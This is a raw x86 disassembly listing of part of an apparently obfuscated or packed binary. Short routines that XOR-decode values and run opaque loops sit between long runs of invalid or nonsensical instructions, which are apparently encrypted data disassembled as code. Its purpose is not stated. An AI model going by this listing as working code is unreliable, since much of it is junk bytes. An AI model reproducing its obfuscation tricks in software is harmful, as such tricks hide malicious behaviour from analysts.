  4043d2:	ins    DWORD PTR es:[edi],dx
  4043d3:	or     ch,dh
  4043d5:	xor    BYTE PTR [edx-0x28dcf6d1],0x29
  4043dc:	lock jne 0x40419d
  4043e3:	pop    edi
  4043e4:	pop    ebx
  4043e5:	mov    eax,DWORD PTR [ebp-0x8]
  4043e8:	mov    edx,DWORD PTR [ebp+0x10]
  4043eb:	xor    eax,ecx
  4043ed:	add    eax,esi
  4043ef:	mov    DWORD PTR [edx],eax
  4043f1:	mov    eax,DWORD PTR [ebp-0x8]
  4043f4:	xor    eax,ecx
  4043f6:	add    eax,esi
  4043f8:	mov    DWORD PTR [ebp+0x8],eax
  4043fb:	mov    eax,DWORD PTR [ebp+0x8]
  4043fe:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404402:	mov    dl,BYTE PTR [ebp-0x1]
  404405:	cmp    al,dl
  404407:	je     0x40444a
  40440d:	mov    eax,DWORD PTR [ebp+0x8]
  404410:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404414:	mov    edx,DWORD PTR [ebp+0xc]
  404417:	cmp    al,BYTE PTR [edx]
  404419:	jne    0x40467a
  40441f:	mov    eax,DWORD PTR [ebp-0x8]
  404422:	mov    edx,DWORD PTR [ebp+0xc]
  404425:	movsx  edx,BYTE PTR [edx]
  404428:	xor    eax,ecx
  40442a:	add    eax,esi
  40442c:	cmp    edx,eax
  40442e:	je     0x404464
  404434:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  40443b:	lea    eax,[ebp-0x18]
  40443e:	mov    DWORD PTR [ebp-0x14],eax
  404441:	mov    eax,DWORD PTR [ebp-0x14]
  404444:	add    DWORD PTR [eax],0x705fa8f
  40444a:	mov    eax,DWORD PTR [ebp-0x10]
  40444d:	mov    edx,DWORD PTR [ebp+0x8]
  404450:	xor    eax,ecx
  404452:	lea    eax,[eax+edx*1+0x32729e]
  404459:	mov    DWORD PTR [ebp+0x8],eax
  40445c:	inc    DWORD PTR [ebp+0xc]
  40445f:	jmp    0x4043fb
  404464:	mov    eax,DWORD PTR [ebp-0x10]
  404467:	jmp    0x40456c
  40446c:	sbb    esi,DWORD PTR [edi+0x22]
  40446f:	sbb    BYTE PTR [edx],ah
  404471:	cmp    eax,0x7b87773d
  404476:	les    ecx,FWORD PTR ds:0x71ca3344
  40447c:	mov    dh,0x1c
  40447e:	jl     0x4044fc
  404480:	push   esp
  404481:	jl     0x4044ff
  404483:	jl     0x4044b5
  404485:	jp     0x4044f4
  404487:	fcomp  DWORD PTR [ecx+0x73fa038b]
  40448d:	les    esi,FWORD PTR ds:0xa4d0c4c5
  404493:	fimul  DWORD PTR [edx+0x542b10da]
  404499:	pop    edi
  40449a:	mov    esp,0xab4dbecc
  40449f:	or     eax,DWORD PTR [ecx-0x5fa9c675]
  4044a5:	mov    ds:0xc29f58b3,al
  4044aa:	fst    DWORD PTR [edi+0x22]
  4044ad:	out    dx,eax
  4044ae:	cli    
  4044af:	push   ecx
  4044b0:	adc    eax,0x287a43c0
  4044b5:	pop    ds
  4044b6:	pushf  
  4044b7:	lods   eax,DWORD PTR ds:[esi]
  4044b8:	in     eax,0x9e
  4044ba:	xor    cl,ch
  4044bc:	jns    0x4044d0
  4044be:	push   eax
  4044bf:	cs or  eax,0x2df537c0
  4044c5:	enter  0xcf49,0xd3
  4044c9:	add    ch,BYTE PTR [edx+0x69501d9f]
  4044cf:	outs   dx,DWORD PTR ds:[esi]
  4044d0:	xor    BYTE PTR [edi],dh
  4044d2:	test   BYTE PTR [esi+0x2c9e070f],ah
  4044d8:	lds    ebp,FWORD PTR [eax+0x74]
  4044db:	fcomp  QWORD PTR [ebp+0x4ab5e075]
  4044e1:	ins    BYTE PTR es:[edi],dx
  4044e2:	push   esp
  4044e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044e4:	cld    
  4044e5:	les    ebp,FWORD PTR [edx-0x64385fc5]
  4044eb:	push   ebp
  4044ec:	fistp  QWORD PTR [esp+eax*2]
  4044ef:	jmp    0x40453d
  4044f1:	inc    edx
  4044f2:	jb     0x40456a
  4044f4:	loope  0x40447d
  4044f6:	pop    edi
  4044f7:	popf   
  4044f8:	mov    ds:0x315c1353,eax
  4044fd:	in     al,0x50
  4044ff:	pop    esp
  404500:	or     al,0x23
  404502:	mov    edi,DWORD PTR [edi+ebx*8+0x59cba297]
  404509:	cmp    BYTE PTR [edi+0x73380456],bh
  40450f:	mov    ecx,0x8445a751
  404514:	cmp    BYTE PTR ds:0xbe7e08ab,bl
  40451a:	pusha  
  40451b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40451c:	xlat   BYTE PTR ds:[ebx]
  40451d:	add    dh,dh
  40451f:	inc    eax
  404520:	jp     0x4044fb
  404522:	xor    esp,eax
  404524:	inc    ebx
  404525:	aas    
  404526:	add    esi,esp
  404528:	mov    eax,ds:0x1b4d2506
  40452d:	mov    BYTE PTR [ebx+0x35],bh
  404530:	inc    ebx
  404531:	pusha  
  404532:	and    eax,DWORD PTR [eax]
  404534:	test   eax,0x28f0af11
  404539:	es xor dl,ah
  40453c:	hlt    
  40453d:	mov    ebp,0x7928da4f
  404542:	xchg   ebp,ebp
  404544:	inc    ebx
  404545:	xor    BYTE PTR [edi-0x39],dl
  404548:	inc    ebx
  404549:	jp     0x40457c
  40454b:	sub    esi,DWORD PTR [esi-0x5876ab9d]
  404551:	pop    edx
  404552:	test   DWORD PTR [ecx+edi*8-0x62],edx
  404556:	jmp    0x40f5c811
  40455b:	imul   ecx,DWORD PTR [eax-0x2acb46f9],0xfffffff4
  404562:	mov    edi,0x37661dd5
  404567:	or     esi,DWORD PTR [ebx+0x5c]
  40456a:	inc    edx
  40456b:	adc    eax,0x4d8bc133
  404570:	adc    cl,ch
  404572:	add    BYTE PTR [ecx],al
  404574:	add    BYTE PTR [eax],al
  404576:	imul   eax,DWORD PTR ds:0x7d79fdb1,0x7b
  40457d:	test   DWORD PTR [esi],esp
  40457f:	xchg   ecx,eax
  404580:	retf   
  404581:	frstor [ebx+0x56]
  404584:	add    al,0xf9
  404586:	scas   al,BYTE PTR es:[edi]
  404587:	pop    ds
  404588:	jl     0x404606
  40458a:	push   esp
  40458b:	jl     0x404609
  40458d:	jl     0x40456d
  40458f:	add    BYTE PTR [ecx-0x3],ch
  404592:	or     al,0x40
  404594:	cmc    
  404595:	mov    cl,BYTE PTR [esi]
  404597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404598:	mov    eax,ds:0xee1afde4
  40459d:	imul   ebx,DWORD PTR [ebx+0x625fd5bc],0xe5a47b50
  4045a7:	mov    ah,BYTE PTR [ebx-0x19]
  4045aa:	push   cs
  4045ab:	sbb    DWORD PTR [ecx+edx*2-0x66c2f630],0xe
  4045b3:	ja     0x4045be
  4045b5:	jne    0x40460b
  4045b7:	mov    ah,0x28
  4045b9:	lods   eax,DWORD PTR ds:[esi]
  4045ba:	mov    esi,0x320715c3
  4045bf:	adc    BYTE PTR [esp+ebp*1+0x77],0x25
  4045c4:	push   eax
  4045c5:	cmp    DWORD PTR [eax+0x6d],ebx
  4045c8:	mov    dh,0x37
  4045ca:	cmp    edx,esp
  4045cc:	(bad)  
  4045cd:	iret   
  4045ce:	icebp  
  4045cf:	adc    al,0x37
  4045d1:	loop   0x40458c
  4045d3:	aas    
  4045d4:	sub    DWORD PTR [ebx-0x2],edx
  4045d7:	pop    edx
  4045d8:	shl    BYTE PTR [ebx],1
  4045da:	cmc    
  4045db:	(bad)  
  4045dc:	mov    eax,0x4f4c275f
  4045e1:	xchg   ebp,eax
  4045e2:	jne    0x404574
  4045e4:	pop    ds
  4045e5:	mov    al,ds:0xb287a8d6
  4045ea:	or     BYTE PTR [eax],dl
  4045ec:	inc    ebp
  4045ed:	xchg   edi,eax
  4045ee:	imul   esi,DWORD PTR fs:[ebx],0xee05ff24
  4045f5:	cdq    
  4045f6:	pushf  
  4045f7:	jle    0x404624
  4045f9:	push   esi
  4045fa:	icebp  
  4045fb:	adc    BYTE PTR [edx+0x696d68e8],ch
  404601:	add    BYTE PTR [ecx-0x55],dl
  404604:	data16 jmp 0x40458a
  404607:	ret    
  404608:	gs sahf 
  40460a:	out    dx,al
  40460b:	mov    bh,0xa4
  40460d:	ds ss lahf 
  404610:	dec    ecx
  404611:	pop    ss
  404612:	leave  
  404613:	cmp    al,0x12
  404615:	leave  
  404616:	mov    bl,0xb4
  404618:	(bad)  
  404619:	or     DWORD PTR [edx+0x11],ecx
  40461c:	jnp    0x40462a
  40461e:	jb     0x40464a
  404620:	call   0xdd25ff2b
  404625:	and    al,0x6a
  404627:	ror    BYTE PTR [esi],cl
  404629:	xor    DWORD PTR [ecx-0x16],esp
  40462c:	mov    eax,ds:0x540f30a3
  404631:	xchg   esp,eax
  404632:	xor    edx,ebp
  404634:	mov    edi,0x3e57b33a
  404639:	test   DWORD PTR [ebx],eax
  40463b:	je     0x404646
  40463d:	pop    ds
  40463e:	es jg  0x4045fc
  404641:	sub    ecx,DWORD PTR [ecx-0x14b4f594]
  404647:	sbb    edx,ebp
  404649:	jecxz  0x4045d7
  40464b:	sbb    esi,DWORD PTR [ebx+0x1b2d7087]
  404651:	std    
  404652:	xchg   ebx,edi
  404654:	pop    esi
  404655:	mov    esp,0xc488128c
  40465a:	mov    ebp,DWORD PTR [eax-0x2]
  40465d:	call   0x7126:0x5d0e672b
  404664:	stc    
  404665:	stos   BYTE PTR es:[edi],al
  404666:	push   0x61
  404668:	das    
  404669:	dec    esp
  40466a:	pop    edx
  40466b:	and    DWORD PTR [edi-0x74162a3a],ecx
  404671:	mov    ah,ah
  404673:	stc    
  404674:	pusha  
  404675:	mov    BYTE PTR [ebx],0xc6
  404678:	mov    DWORD PTR [ecx],eax
  40467a:	pop    esi
  40467b:	leave  
  40467c:	ret    0xc
  40467f:	push   ebp
  404680:	mov    ebp,esp
  404682:	push   ecx
  404683:	adc    edx,0x1579
  404689:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  404690:	sbb    DWORD PTR ds:0x4292a5,0xe46
  40469a:	mov    eax,DWORD PTR [ebp-0x4]
  40469d:	xor    edx,edx
  40469f:	add    edx,DWORD PTR ds:0x42c8ba
  4046a5:	xor    ecx,ecx
  4046a7:	add    ecx,DWORD PTR ds:0x42c8ce
  4046ad:	sub    edx,ecx
  4046af:	xor    edx,DWORD PTR [edx+ecx*1]
  4046b2:	mov    edx,DWORD PTR [ebp+0x10]
  4046b5:	xor    DWORD PTR ds:0x427cf7,0x3e4e
  4046bf:	mov    ecx,0x7510857
  4046c4:	sbb    DWORD PTR ds:0x427cff,0x4292c5
  4046ce:	xor    eax,ecx
  4046d0:	add    DWORD PTR ds:0x4275ac,0x4292c1
  4046da:	add    eax,0x32729e
  4046df:	mov    DWORD PTR [edx],eax
  4046e1:	adc    DWORD PTR ds:0x427cff,0xab1
  4046eb:	mov    eax,DWORD PTR [ebp+0xc]
  4046ee:	mov    DWORD PTR ds:0x4292c5,0x1c
  4046f8:	cmp    DWORD PTR ds:0x4292c5,0x0
  4046ff:	je     0x4048d6
  404705:	cmp    DWORD PTR ds:0x4292c5,0xd
  40470c:	jne    0x404718
  404712:	call   DWORD PTR ds:0x4279d3
  404718:	cmp    DWORD PTR ds:0x4292c5,0xe
  40471f:	jne    0x404734
  404725:	xor    edx,edx
  404727:	xor    edx,DWORD PTR ds:0x4292c5
  40472d:	dec    edx
  40472e:	mov    DWORD PTR ds:0x4292c5,edx
  404734:	xor    edx,edx
  404736:	xor    edx,DWORD PTR ds:0x4292c5
  40473c:	dec    edx
  40473d:	mov    DWORD PTR ds:0x4292c5,edx
  404743:	jmp    0x4046f8
  404748:	and    DWORD PTR ds:0x427cf7,0x0
  404752:	jmp    0x404766
  404757:	xor    edx,edx
  404759:	or     edx,DWORD PTR ds:0x427cf7
  40475f:	inc    edx
  404760:	mov    DWORD PTR ds:0x427cf7,edx
  404766:	cmp    DWORD PTR ds:0x427cf7,0x1c
  40476d:	jae    0x4048d6
  404773:	cmp    DWORD PTR ds:0x427cf7,0x21
  40477a:	jne    0x404791
  404780:	push   DWORD PTR [ebp-0xc]
  404783:	push   DWORD PTR [ebp-0x28]
  404786:	push   0x3a03
  40478b:	call   DWORD PTR ds:0x4278f3
  404791:	jmp    0x404757
  404796:	jmp    0x4048d6
  40479b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40479c:	mov    eax,0x5df986f9
  4047a1:	gs mov ebx,0x53054722
  4047a7:	(bad)  
  4047a8:	neg    esi
  4047aa:	cmp    eax,0x7c7c1e86
  4047af:	adc    DWORD PTR [edi+0x7c],edi
  4047b2:	jl     0x404822
  4047b4:	push   esi
  4047b5:	cmp    ecx,esp
  4047b7:	ss mov cl,0x5a
  4047ba:	jns    0x40475f
  4047bc:	push   esp
  4047bd:	inc    ebp
  4047be:	gs jbe 0x4047ee
  4047c1:	and    eax,0x52a7fe9
  4047c6:	daa    
  4047c7:	idiv   DWORD PTR [ecx+0x30f21ebc]
  4047cd:	shr    bl,1
  4047cf:	mov    ebx,0xc6da56f5
  4047d4:	push   eax
  4047d5:	mov    eax,0x3f2167f3
  4047da:	fld    QWORD PTR [edx+0x3089b9cb]
  4047e0:	mov    edx,0xec43b7a3
  4047e5:	shl    DWORD PTR [esi],0x83
  4047e8:	dec    eax
  4047e9:	(bad)  
  4047ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047eb:	aam    0xbb
  4047ed:	pop    ebp
  4047ee:	jae    0x40480d
  4047f0:	xlat   BYTE PTR gs:[ebx]
  4047f2:	mov    ds:0xc035802f,al
  4047f7:	push   esi
  4047f8:	dec    ecx
  4047f9:	mov    ss,ebp
  4047fb:	aaa    
  4047fc:	not    esp
  4047fe:	std    
  4047ff:	push   ebp
  404800:	mov    ds:0xf076610d,eax
  404805:	call   DWORD PTR [ecx-0x30250035]
  40480b:	push   edx
  40480c:	test   eax,0xff5172e8
  404811:	add    edx,esp
  404813:	xor    DWORD PTR [ebx-0x9],esi
  404816:	rcl    BYTE PTR [edi+esi*8-0x22],1
  40481a:	mov    dh,0x1b
  40481c:	mov    ds:0x2ce7c012,al
  404821:	retf   0x913a
  404824:	pusha  
  404825:	cmp    BYTE PTR [edx],0x8c
  404828:	jne    0x4047dd
  40482a:	dec    edi
  40482b:	dec    BYTE PTR [ecx-0x47]
  40482e:	call   0xad85:0xffb9d400
  404835:	lahf   
  404836:	lock and ch,BYTE PTR [edi+0x11980571]
  40483d:	lods   eax,DWORD PTR ds:[esi]
  40483e:	push   ebp
  40483f:	ins    BYTE PTR es:[edi],dx
  404840:	hlt    
  404841:	push   edx
  404842:	in     eax,0x16
  404844:	jg     0x4047fe
  404846:	adc    BYTE PTR [esi],ah
  404848:	daa    
  404849:	pop    esp
  40484a:	cs adc eax,0x1f83fd62
  404850:	push   esi
  404851:	call   DWORD PTR ds:0x78ae9203
  404857:	cld    
  404858:	jbe    0x404854
  40485a:	jne    0x404832
  40485c:	jb     0x4047f1
  40485e:	bound  ecx,QWORD PTR [ecx-0x2be2cb66]
  404864:	mov    esi,0xbdc63433
  404869:	xor    esi,eax
  40486b:	cmp    eax,0x24647a07
  404870:	sub    BYTE PTR [esi],0x4b
  404873:	push   ds
  404874:	rol    ah,0x24
  404877:	jl     0x4048db
  404879:	jmp    0x7085:0x9807fc56
  404880:	jge    0x4048a0
  404882:	sub    dl,ch
  404884:	jnp    0x4048c8
  404886:	jae    0x40484c
  404888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404889:	ins    DWORD PTR es:[edi],dx
  40488a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40488b:	fstp   TBYTE PTR [ebp+0x7a7846bf]
  404891:	jmp    0x649678c3
  404896:	(bad)  [edi]
  404898:	stos   BYTE PTR es:[edi],al
  404899:	es jecxz 0x4048b0
  40489c:	mov    ds:0x68253ab,al
  4048a1:	call   0x4e26ddb7
  4048a6:	xor    DWORD PTR [ebx+ebx*4-0x6a],esi
  4048aa:	push   ebp
  4048ab:	pop    ebx
  4048ac:	push   ebx
  4048ad:	loop   0x4048b8
  4048af:	adc    dl,BYTE PTR [eax+0x7]
  4048b2:	stc    
  4048b3:	lods   al,BYTE PTR ds:[esi]
  4048b4:	lods   al,BYTE PTR ds:[esi]
  4048b5:	xchg   ebx,eax
  4048b6:	xchg   edx,eax
  4048b7:	and    BYTE PTR [ebx+0xe],0xe2
  4048bb:	rcr    DWORD PTR [ecx-0x694a5b2d],1
  4048c1:	addr16 test ebx,edx
  4048c4:	mov    dl,0x8b
  4048c6:	mov    bh,0x79
  4048c8:	cmp    DWORD PTR ds:0x44ea98d3,ebp
  4048ce:	mov    bl,0xcb
  4048d0:	ss and eax,0x46104dcc
  4048d6:	xor    eax,ecx
  4048d8:	push   esi
  4048d9:	mov    esi,DWORD PTR [ebp+0x10]
  4048dc:	mov    edx,0x32729e
  4048e1:	add    eax,edx
  4048e3:	mov    DWORD PTR [esi+0x4],eax
  4048e6:	mov    eax,DWORD PTR [ebp+0x14]
  4048e9:	mov    esi,DWORD PTR [ebp+0x10]
  4048ec:	mov    DWORD PTR [esi+0x8],eax
  4048ef:	mov    eax,DWORD PTR [ebp+0x18]
  4048f2:	mov    esi,DWORD PTR [ebp+0x10]
  4048f5:	mov    DWORD PTR [esi+0xc],eax
  4048f8:	mov    eax,DWORD PTR [ebp+0x1c]
  4048fb:	mov    esi,DWORD PTR [ebp+0x10]
  4048fe:	jmp    0x404a3e
  404903:	shl    DWORD PTR [ebx+0x7],0xc
  404907:	mov    ebp,0x4065d978
  40490c:	mov    eax,ds:0xc36be8b5
  404911:	ins    BYTE PTR es:[edi],dx
  404912:	iret   
  404913:	mov    ebx,0x117c7c11
  404918:	jg     0x404996
  40491a:	jl     0x4048b8
  40491c:	cmp    eax,DWORD PTR [ebp+eax*8-0x2835beb2]
  404923:	hlt    
  404924:	sub    ebp,esi
  404926:	cmp    eax,0x39453dbc
  40492b:	popf   
  40492c:	xchg   esp,eax
  40492d:	cmp    BYTE PTR [ecx],ah
  40492f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404930:	test   al,0x8d
  404932:	adc    DWORD PTR [esi+0x32],ebx
  404935:	and    DWORD PTR [eax-0x4149304a],ebp
  40493b:	pop    ecx
  40493c:	mov    al,0x92
  40493e:	sahf   
  40493f:	inc    eax
  404940:	xchg   ebx,eax
  404941:	shl    DWORD PTR [edx-0x18],0x6e
  404945:	(bad)  
  404946:	rcl    BYTE PTR [eax-0x7c],cl
  404949:	cmp    esi,DWORD PTR [esi+ebp*2-0x13]
  40494d:	outs   dx,BYTE PTR ds:[esi]
  40494e:	sti    
  40494f:	xor    BYTE PTR ds:0x9b8d5f4e,0x57
  404956:	push   ds
  404957:	aad    0x35
  404959:	mov    eax,0x879184b7
  40495e:	adc    ecx,DWORD PTR [eax+edx*4-0x45e6be1]
  404965:	jecxz  0x40497e
  404967:	clc    
  404968:	lock stos DWORD PTR es:[edi],eax
  40496a:	inc    ecx
  40496b:	outs   dx,BYTE PTR ds:[esi]
  40496c:	xchg   bl,bl
  40496e:	std    
  40496f:	fwait
  404970:	lods   eax,DWORD PTR ds:[esi]
  404971:	jmp    0x767a:0x53e2e16c
  404978:	adc    BYTE PTR [esi],ch
  40497a:	inc    ebp
  40497b:	inc    esi
  40497c:	in     al,0x6b
  40497e:	pop    ebp
  40497f:	test   eax,0xc6f3d061
  404984:	outs   dx,BYTE PTR ds:[esi]
  404985:	add    eax,DWORD PTR [edi+ebp*2]
  404988:	xchg   esi,eax
  404989:	(bad)  
  40498a:	mov    ebp,0x2864976c
  40498f:	inc    eax
  404990:	sbb    eax,0xa2d9ff89
  404995:	jp     0x40498b
  404997:	pop    ebp
  404998:	mov    al,0xfd
  40499a:	call   0x4e88:0xa18ad1e6
  4049a1:	shr    DWORD PTR [ebx-0x28],0x63
  4049a5:	inc    esp
  4049a6:	sbb    eax,ebp
  4049a8:	cmp    BYTE PTR [ebx],dh
  4049aa:	lds    ecx,FWORD PTR [ebp+0x22]
  4049ad:	push   edx
  4049ae:	jnp    0x4049b7
  4049b0:	xchg   ecx,eax
  4049b1:	jo     0x404a26
  4049b3:	out    0x3d,al
  4049b5:	adc    eax,DWORD PTR [eax]
  4049b7:	and    ch,BYTE PTR [eax]
  4049b9:	adc    eax,0x188ead81
  4049be:	or     DWORD PTR [edi+0x1055cf2c],esp
  4049c4:	aad    0x3d
  4049c6:	pop    fs
  4049c8:	push   ds
  4049c9:	sub    esi,DWORD PTR [ecx-0x359c0670]
  4049cf:	jb     0x4049e3
  4049d1:	scas   al,BYTE PTR es:[edi]
  4049d2:	sar    DWORD PTR [edi],cl
  4049d4:	xlat   BYTE PTR ds:[ebx]
  4049d5:	push   edx
  4049d6:	jns    0x404a55
  4049d8:	add    BYTE PTR [eax-0x25c33c48],bl
  4049de:	lea    edi,[ebx+edx*8-0x6]
  4049e2:	je     0x404a2a
  4049e4:	cmp    edi,DWORD PTR [ecx]
  4049e6:	ret    
  4049e7:	ins    BYTE PTR es:[edi],dx
  4049e8:	dec    edi
  4049e9:	dec    ebx
  4049ea:	mov    bl,0x19
  4049ec:	daa    
  4049ed:	shl    bh,0x4b
  4049f0:	inc    esp
  4049f1:	pop    esp
  4049f2:	and    cl,BYTE PTR [ebx+0x4e0fbfc]
  4049f8:	push   0xe98f35da
  4049fd:	jne    0x404a6c
  4049ff:	pop    esi
  404a00:	and    edi,DWORD PTR [eax-0x1b]
  404a03:	(bad)  
  404a04:	lock mov edx,0xfeb12a0e
  404a0a:	ss xchg ebp,eax
  404a0c:	xchg   ebx,eax
  404a0d:	xchg   edx,eax
  404a0e:	aam    0xc3
  404a10:	pop    ss
  404a11:	daa    
  404a12:	jbe    0x404a8e
  404a14:	popf   
  404a15:	fldenv ds:0x4d761548
  404a1b:	stos   BYTE PTR es:[edi],al
  404a1c:	sbb    BYTE PTR [esi+0x4b7960fa],bh
  404a22:	pop    edx
  404a23:	add    BYTE PTR ds:0xe66b4270,ch
  404a29:	push   ds
  404a2a:	cmp    DWORD PTR [esi],0xffffffe9
  404a2d:	sub    eax,0x342afbca
  404a32:	dec    ebp
  404a33:	mov    bh,0x60
  404a35:	jge    0x404a16
  404a37:	aam    0xd
  404a39:	pusha  
  404a3a:	aas    
  404a3b:	mov    al,0xac
  404a3d:	and    al,0x89
  404a3f:	inc    esi
  404a40:	adc    BYTE PTR [ebx+0x8458bc0],cl
  404a46:	xor    eax,ecx
  404a48:	add    eax,edx
  404a4a:	pop    esi
  404a4b:	leave  
  404a4c:	ret    0x18
  404a4f:	push   ebp
  404a50:	mov    ebp,esp
  404a52:	mov    eax,DWORD PTR [ebp+0xc]
  404a55:	xor    edx,edx
  404a57:	mov    ecx,0x7264fcad
  404a5c:	div    ecx
  404a5e:	jmp    0x404b9e
  404a63:	outs   dx,BYTE PTR ds:[esi]
  404a64:	stc    
  404a65:	sti    
  404a66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a67:	jnp    0x404a23
  404a69:	gs stc 
  404a6b:	dec    esi
  404a6c:	xchg   DWORD PTR [ebx+0x293c4b0d],esp
  404a72:	int    0x5c
  404a74:	adc    BYTE PTR [esp+edi*2+0x11],bh
  404a78:	jg     0x404af6
  404a7a:	jl     0x404a90
  404a7c:	adc    ecx,DWORD PTR [ebx-0x6349c1ff]
  404a82:	jle    0x404a11
  404a84:	mov    DWORD PTR [edi-0x7b],ebp
  404a87:	idiv   cl
  404a89:	ins    DWORD PTR es:[edi],dx
  404a8a:	xor    dl,0x5
  404a8d:	test   eax,0xd7fc2fd3
  404a92:	mov    bl,0x91
  404a94:	mov    edx,0xeeb76be6
  404a99:	push   esi
  404a9a:	mov    BYTE PTR [esi],dh
  404a9c:	out    dx,eax
  404a9d:	js     0x404b06
  404a9f:	xchg   DWORD PTR [edi],ebp
  404aa1:	cmp    esp,0xffffffc8
  404aa4:	push   0xffffffe1
  404aa6:	xlat   BYTE PTR ds:[ebx]
  404aa7:	jmp    0xdb8d:0x15ac2a44
  404aae:	in     al,0xa8
  404ab0:	ror    ah,cl
  404ab2:	pop    es
  404ab3:	cmp    bh,BYTE PTR [edi+edi*8+0x5d]
  404ab7:	shl    BYTE PTR [edi],0x3b
  404aba:	pop    ebp
  404abb:	stos   DWORD PTR es:[edi],eax
  404abc:	je     0x404a8a
  404abe:	loop   0x404b26
  404ac0:	es add ah,al
  404ac3:	mov    al,dl
  404ac5:	pop    esi
  404ac7:	out    0x82,al
  404ac9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404aca:	cmp    eax,0xb032b089
  404acf:	push   ecx
  404ad0:	jp     0x404aaf
  404ad2:	aad    0xdd
  404ad4:	jl     0x404ad7
  404ad6:	inc    ebp
  404ad7:	sbb    ah,BYTE PTR [ecx]
  404ad9:	mov    ch,0x12
  404adb:	cwde   
  404adc:	imul   ebx,eax,0x5e
  404adf:	test   al,0x80
  404ae1:	hlt    
  404ae2:	fwait
  404ae3:	and    bh,BYTE PTR [edx]
  404ae5:	js     0x404b19
  404ae7:	push   0x2f74d5ac
  404aec:	mov    cl,0xe0
  404aee:	enter  0x2cdc,0x70
  404af2:	jnp    0x404b6a
  404af4:	loope  0x404b26
  404af6:	daa    
  404af7:	shr    BYTE PTR [edx-0x54],0x76
  404afb:	sti    
  404afc:	mov    es,WORD PTR [esp+esi*4]
  404aff:	xlat   BYTE PTR ds:[ebx]
  404b00:	lea    esp,[ebx-0x3c]
  404b03:	stos   BYTE PTR es:[edi],al
  404b04:	and    al,0xf6
  404b06:	neg    DWORD PTR [esi-0x730d231c]
  404b0c:	call   0x2256369e
  404b11:	retf   
  404b12:	aaa    
  404b13:	mov    ah,0x1d
  404b15:	aam    0x4b
  404b17:	ss jnp 0x404aa6
  404b1a:	xchg   ecx,eax
  404b1b:	cmp    DWORD PTR [ebp+0x33],0xffffff93
  404b1f:	dec    ebx
  404b20:	retf   0xde51
  404b23:	not    edi
  404b25:	sbb    cl,bl
  404b27:	or     edx,esp
  404b29:	inc    ecx
  404b2a:	pop    eax
  404b2b:	cmp    bl,BYTE PTR [esi]
  404b2d:	jae    0x404ada
  404b2f:	test   eax,0xbdf2ead4
  404b34:	cmp    al,0x7d
  404b36:	ret    
  404b37:	shr    BYTE PTR [ebx+ecx*8],cl
  404b3a:	dec    esp
  404b3b:	and    esp,edi
  404b3d:	test   eax,0x83ef825a
  404b42:	mov    esp,0x48f9b4f7
  404b47:	jnp    0x404b4b
  404b49:	push   eax
  404b4a:	xlat   BYTE PTR ds:[ebx]
  404b4b:	popf   
  404b4c:	cmp    al,ch
  404b4e:	xchg   esi,eax
  404b4f:	mov    esp,0xb24c745b
  404b54:	jecxz  0x404b79
  404b56:	add    eax,0x78e79220
  404b5b:	push   ds
  404b5c:	fwait
  404b5d:	mov    edx,0x26a3bbfe
  404b62:	aam    0x57
  404b64:	push   ss
  404b65:	mov    al,ds:0x490c2812
  404b6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b6b:	jbe    0x404ba9
  404b6d:	mov    edx,0xf694c6ef
  404b72:	js     0x404b3c
  404b74:	inc    ebp
  404b75:	push   esi
  404b76:	xchg   edi,eax
  404b77:	lods   eax,DWORD PTR ds:[esi]
  404b78:	lahf   
  404b79:	xor    BYTE PTR [esi+0x755f989d],bh
  404b7f:	mov    esp,0x15f4a35e
  404b84:	jns    0x404b66
  404b86:	inc    ebx
  404b87:	mov    dh,0x18
  404b89:	push   ss
  404b8a:	sbb    dh,BYTE PTR [edi+0x50]
  404b8d:	out    0xc3,al
  404b8f:	add    ebx,DWORD PTR [ebx-0x18d24ba5]
  404b95:	gs pop ecx
  404b97:	push   ecx
  404b98:	add    cl,BYTE PTR [esi+0x40]
  404b9b:	mov    esp,0x4d8be31c
  404ba0:	adc    BYTE PTR [ebx],ah
  404ba2:	enter  0xc981,0x8f
  404ba6:	sbb    eax,0x3be98116
  404bab:	add    DWORD PTR [eax],eax
  404bad:	add    ah,ch
  404baf:	xchg   ebx,eax
  404bb0:	imul   eax,esp,0x7b
  404bb3:	les    esp,FWORD PTR [ebx-0x55]
  404bb6:	jmp    0xd92ccde5
  404bbb:	cmp    eax,DWORD PTR ds:0x7c127139
  404bc1:	jl     0x404bd4
  404bc3:	jg     0x404c41
  404bc5:	jl     0x404c42
  404bc7:	pop    es
  404bc8:	pop    edx
  404bc9:	jl     0x404bf2
  404bcb:	sub    eax,0x826584a0
  404bd0:	div    ebx
  404bd2:	pop    DWORD PTR [edx]
  404bd4:	mov    ebx,0x8422c163
  404bd9:	and    eax,0x9fe95e1c
  404bde:	(bad)  
  404bdf:	jo     0x404b68
  404be1:	scas   eax,DWORD PTR es:[edi]
  404be2:	int    0x62
  404be4:	repz loopne 0x404bd7
  404be7:	mov    ecx,0xc36ba929
  404bec:	pop    eax
  404bed:	adc    cl,BYTE PTR [edx+edx*4]
  404bf0:	mov    esi,DWORD PTR [edx]
  404bf2:	dec    edi
  404bf3:	ins    DWORD PTR es:[edi],dx
  404bf4:	loope  0x404b9c
  404bf6:	mov    edx,0xb4f03741
  404bfb:	out    0xca,eax
  404bfd:	push   esi
  404bfe:	adc    esi,DWORD PTR [esi+eiz*1+0x73]
  404c02:	cmp    cl,BYTE PTR [eax]
  404c04:	cmp    DWORD PTR [ecx-0x2a61ef65],ebx
  404c0a:	dec    eax
  404c0b:	das    
  404c0c:	xchg   edx,eax
  404c0d:	aam    0x71
  404c0f:	xchg   edx,eax
  404c10:	mov    dl,0x34
  404c12:	xchg   ebx,eax
  404c13:	pop    ebp
  404c14:	dec    edi
  404c15:	fimul  DWORD PTR [eax*8+0x3f4b516]
